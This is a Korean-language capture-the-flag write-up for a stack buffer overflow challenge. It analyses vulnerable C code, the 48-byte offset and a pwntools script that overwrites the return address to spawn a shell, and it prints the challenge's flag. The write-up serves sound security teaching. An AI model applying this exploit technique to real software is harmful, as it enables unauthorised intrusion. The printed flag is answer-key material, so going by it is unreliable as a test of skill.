# Return Address Overwrite 문제 풀이 보고서

### 1. 문제 개요

문제명 : Return Address Overwrite
유형 : Pwnable (Stack Buffer Overflow)
기법 : Return Address Overwrite

이번 문제는 스택 버퍼 오버플로우 취약점을 이용하여 함수의 반환 주소(Return Address)를 조작하고, 프로그램 내부에 존재하는 get_shell() 함수를 실행시키는 문제이다.

### 2 소스 코드 분석

문제에서 제공된 소스 코드는 다음과 같다.

void get_shell() {
char *cmd = "/bin/sh";
char *args[] = {cmd, NULL};
execve(cmd, args, NULL);
}

int main() {
char buf[0x28];

    init();

    printf("Input: ");
    scanf("%s", buf);

    return 0;

}

코드를 분석해보면 main() 함수 내부에 char buf[0x28] 버퍼가 존재한다.

char buf[0x28];
scanf("%s", buf);

buf의 크기는 0x28(40바이트)이지만, scanf("%s", buf)는 입력 길이를 제한하지 않는다. 따라서 40바이트보다 긴 문자열을 입력하면 버퍼 뒤에 저장된 데이터까지 덮어쓸 수 있다.

이러한 취약점을 스택 버퍼 오버플로우(Stack Buffer Overflow)라고 한다.

### 3. 스택 구조 분석

x64 환경에서 main() 함수의 스택 구조는 다음과 같다.

Return Address
Saved RBP
buf[40]

버퍼를 초과하여 입력하면 먼저 Saved RBP가 덮어써지고, 이후 Return Address까지 덮어쓸 수 있다.

Return Address에 도달하기 위해 필요한 오프셋은 다음과 같다.

buf : 40바이트
Saved RBP : 8바이트

따라서

40 + 8 = 48 bytes

총 48바이트를 채우면 Return Address 위치에 도달할 수 있다.

### 4. 공격 아이디어

프로그램 내부에는 이미 쉘을 실행하는 함수가 존재한다.

void get_shell() {
char *cmd = "/bin/sh";
char *args[] = {cmd, NULL};
execve(cmd, args, NULL);
}

따라서 쉘코드를 삽입할 필요 없이, Return Address를 get_shell() 함수의 주소로 변경하면 된다.

공격 순서는 다음과 같다.

buf(40바이트)를 채운다.
Saved RBP(8바이트)를 채운다.
Return Address를 get_shell 주소로 덮어쓴다.
main 함수가 종료되면서 get_shell()이 실행된다.
쉘 획득 후 flag를 확인한다.

### 5. get_shell 주소 확인

gdb(pwndbg)를 이용하여 get_shell 함수의 주소를 확인하였다.

pwndbg> p get_shell
$1 = {<text variable, no debug info>} 0x401196 <get_shell>

실행 환경에 따라 주소는 달라질 수 있으므로 직접 확인해야 한다.

### 6. 익스플로잇 코드 작성

from pwn import \*

p = process('./rao')

payload = b'A' \* 48
payload += p64(0x401196)

p.sendline(payload)
p.interactive()
코드 설명
from pwn import \*

Pwntools 라이브러리를 사용하기 위해 import한다.

p = process('./rao')

로컬에서 프로그램을 실행한다.

payload = b'A' \* 48

buf(40바이트)와 Saved RBP(8바이트)를 채우기 위한 더미 데이터이다.

payload += p64(0x401196)

Return Address를 get_shell() 주소로 덮어쓴다.

p64()는 64비트 주소를 Little Endian 형태로 변환해주는 함수이다.

p.sendline(payload)

공격 페이로드를 전송한다.

p.interactive()

쉘이 실행되면 사용자와 상호작용할 수 있도록 Interactive 모드로 전환한다.

### 7. 실행 결과

익스플로잇 코드를 실행하면 프로그램의 Return Address가 get_shell() 함수 주소로 변경된다.

프로그램이 종료되는 순간 원래의 복귀 주소 대신 get_shell() 함수가 실행되며 /bin/sh 쉘을 획득할 수 있다.

이후 쉘에서 다음 명령어를 실행하여 플래그를 확인하였다.

cat flag

플래그가 정상적으로 출력되는 것을 확인하였다.

### 8. 최종 익스플로잇 결과 및 플래그 획득

환경 구축 후 solve.py 공격 스크립트를 실행한 결과, main 함수의 Return Address가 정상적으로 변조되어 get_shell() 함수가 실행되었으며, 대기 상태 프롬프트($)와 함께 원격 서버의 interactive 셸을 탈취하는 데 성공했다.

최종 플래그: DH{5f47cd0e441bdc6ce8bf6b8a3a0608dc}

<img width="1116" height="332" alt="Image" src="https://github.com/user-attachments/assets/be912072-268b-42bc-8dff-c5a820c83826" />

### 9. 결론

이번 문제에서는 스택 버퍼 오버플로우 취약점을 이용하여 Return Address를 조작하는 기법을 실습하였다.

특히 프로그램 내부에 이미 존재하는 get_shell() 함수를 활용하여 쉘을 획득하는 방식으로 공격을 수행하였다. 이를 통해 스택 구조와 Return Address Overwrite의 원리를 이해할 수 있었으며, 버퍼 길이 검증의 중요성을 확인할 수 있었다.
